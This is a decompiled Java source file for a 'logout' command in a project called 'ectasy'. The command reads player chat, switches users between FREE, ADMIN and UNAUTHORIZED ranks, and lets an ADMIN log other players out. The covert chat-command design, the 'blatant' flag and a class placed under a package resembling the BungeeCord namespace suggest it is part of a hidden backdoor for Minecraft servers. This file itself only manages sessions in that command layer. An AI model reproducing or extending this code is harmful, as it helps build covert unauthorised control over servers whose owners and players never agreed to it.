package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "logout",
   description = "Talk in chat normally",
   blatant = false,
   rank = Rank.FREE
)
public class LogoutCommand extends AbstractCommand {

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      User var4 = Ectasy.users.get(var1.getPlayer().getName());
      if (var4.rank == Rank.ADMIN && var3.length > 0) {
         Player var5 = Bukkit.getPlayer(var3[0]);
         if (var5 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " is not online!");
         } else {
            User var6 = Ectasy.users.get(var5.getName());
            if (var6.rank == Rank.UNAUTHORIZED) {
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " is not logged in!");
            } else {
               ChatUtil.sendChat(var5, "You have been logged out by an administrator.");
               ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " has been logged out!");
               var6.rank = Rank.UNAUTHORIZED;
               Ectasy.users.remove(var5.getName());
               Ectasy.users.put(var5.getName(), new User(var5));
            }
         }
      } else {
         ChatUtil.sendChat(var1.getPlayer(), "You can now talk in chat normally.");
         var4.rank = Rank.UNAUTHORIZED;
         Ectasy.users.remove(var1.getPlayer().getName());
         Ectasy.users.put(var1.getPlayer().getName(), new User(var1.getPlayer()));
      }
   }
}
